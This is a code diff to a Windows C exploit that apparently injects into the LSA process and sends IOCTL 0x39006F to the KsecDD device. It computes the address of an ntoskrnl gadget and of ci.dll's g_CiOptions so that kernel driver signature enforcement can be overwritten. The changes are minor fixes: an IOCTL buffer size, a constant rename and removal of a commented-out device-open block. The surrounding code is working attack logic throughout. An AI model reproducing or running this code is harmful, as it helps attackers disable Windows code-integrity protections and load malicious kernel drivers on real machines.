@@ -56,7 +56,7 @@ BOOL WINAPI LsaKsec_SendIoctl()
 							{
 								if (((PWCSCMP)0x3333333333333333)((wchar_t*)pObjectNameInformation->Name.Buffer, (wchar_t*)ObjectName) == 0)
 								{
-									status = ((PDEVICEIOCONTROL)0x4343434343434343)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 0x39006F, (LPVOID)pParameterStruct, 16, NULL, 0, NULL, NULL);
+									status = ((PDEVICEIOCONTROL)0x4343434343434343)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 0x39006F, (LPVOID)pParameterStruct, (DWORD)sizeof(IPC_SET_FUNCTION_RETURN_PARAMETER), NULL, 0, NULL, NULL);
 									if (status)
 									{
 										break;
@@ -112,7 +112,7 @@ int main()
 	
 	windows_version = GetOsBuildNumber();
 	lsa = GetLsaProcessId();
-	if ((NTOSKRNL_GADGET_OFFSET[windows_version] == 0x00) || (CI_G_CI_OPTIONS_OFFSET[windows_version] == 0x00))
+	if ((NTOSKRNL_GADGET_OFFSET[windows_version] == 0x00) || (CI_G_CIOPTIONS_OFFSET[windows_version] == 0x00))
 	{
 		PRINT_ERROR(L"OS is not supported.\n");
 		return 0;
@@ -129,9 +129,9 @@ int main()
 	}
 
 	ntoskrnl_gadget = (UINT64)((PBYTE)GetDriverBaseAddress("ntoskrnl.exe") + NTOSKRNL_GADGET_OFFSET[windows_version]);
-	ci_g_cioptions = (UINT64)((PBYTE)GetDriverBaseAddress("ci.dll") + CI_G_CI_OPTIONS_OFFSET[windows_version]);
+	ci_g_cioptions = (UINT64)((PBYTE)GetDriverBaseAddress("ci.dll") + CI_G_CIOPTIONS_OFFSET[windows_version]);
 	
-	if ((ntoskrnl_gadget > NTOSKRNL_GADGET_OFFSET[windows_version]) && (ci_g_cioptions > CI_G_CI_OPTIONS_OFFSET[windows_version]))
+	if ((ntoskrnl_gadget > NTOSKRNL_GADGET_OFFSET[windows_version]) && (ci_g_cioptions > CI_G_CIOPTIONS_OFFSET[windows_version]))
 	{
 		PRINT_SUCCESS(L"ntoskrnl gadget\t- 0x%-016p\n", (PVOID)ntoskrnl_gadget);
 		PRINT_SUCCESS(L"g_cioptions\t- 0x%-016p\n", (PVOID)ci_g_cioptions);
@@ -185,12 +185,3 @@ int main()
 	return 0;
 
 }
-
-
-/*
-#define DD_KSEC_DEVICE_NAME_U LE_U L"\\Device\\KsecDD
-	RtlInitUnicodeString(&DriverName, DD_KSEC_DEVICE_NAME_U);
-	InitializeObjectAttributes(&ObjA, &DriverName, 0, NULL, NULL);
-	NtOpenFile(&hDriverHandle, SYNCHRONIZE | FILE_READ_DATA, &ObjA, &ios2, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_SYNCHRONOUS_IO_NONALERT);
-
-*/
